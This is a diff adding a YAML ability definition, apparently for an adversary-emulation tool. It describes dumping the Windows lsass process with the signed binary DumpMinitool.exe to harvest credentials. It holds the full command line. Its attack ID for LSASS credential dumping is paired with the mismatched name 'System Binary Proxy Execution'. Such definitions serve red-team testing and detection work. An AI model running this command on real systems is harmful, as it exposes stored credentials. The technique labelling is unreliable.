@@ -1,0 +1,22 @@
+- id: 40ab3c8c-1926-e99a-3443-c5b47a1a4c3f
+  name: DumpMinitool.exe - Creates a memory dump of the lsass process
+  description: Creates a memory dump of the lsass process
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: 'DumpMinitool.exe --file #{host.dir.temp} --processId 1132 --dumpType
+          Full'
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - credential-access
+  version: '1.0'
+  author: mr.d0x
+  created: '2022-01-20'
+  modified: '2022-01-20'
+  operating_system: Windows All Versions
